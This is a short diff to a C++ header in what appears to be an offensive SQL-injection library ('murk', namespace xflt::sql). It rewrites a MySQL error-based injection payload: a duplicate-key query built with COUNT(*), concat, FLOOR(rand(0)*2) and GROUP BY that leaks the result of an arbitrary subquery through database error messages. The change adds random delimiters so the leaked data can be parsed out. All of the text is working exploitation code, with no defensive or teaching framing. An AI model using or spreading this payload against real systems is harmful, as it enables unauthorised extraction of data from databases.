@@ -1,7 +1,8 @@
 #pragma once
 
-#include <murk/flow.hpp>
-#include <murk/flows/string.hpp>
+#include "murk/flow.hpp"
+#include "murk/flows/string.hpp"
+#include "murk/random.hpp"
 
 #include <variant>
 
@@ -71,9 +72,12 @@ namespace murk::xflt::sql {
       case(dbms::MySql): {
         std::string begin = "murkbegin";
         std::string end = "murkend";
-        auto res = oracle(fmt::format("SELECT 1 FROM(SELECT COUNT(*),concat(':!@',({}),'@:!',"
-                                      "FLOOR(rand(0)*2))x FROM information_schema.PLUGINS GROUP BY x)a", sql));
-        return murk::extract(std::regex{":!@(.*)@:!"}, res);
+
+        std::string b = random::random_alnum(8);
+        std::string e = random::random_alnum(8);
+        auto res = oracle(fmt::format("SELECT 1 FROM(SELECT COUNT(*),concat('{}',({}),'{}',"
+                                      "FLOOR(rand(0)*2))x FROM information_schema.PLUGINS GROUP BY x)a", b,sql,e));
+        return bounded(res, b, e);
       } break;
       default:
         throw std::invalid_argument("Unimplemented err_query for dbms");
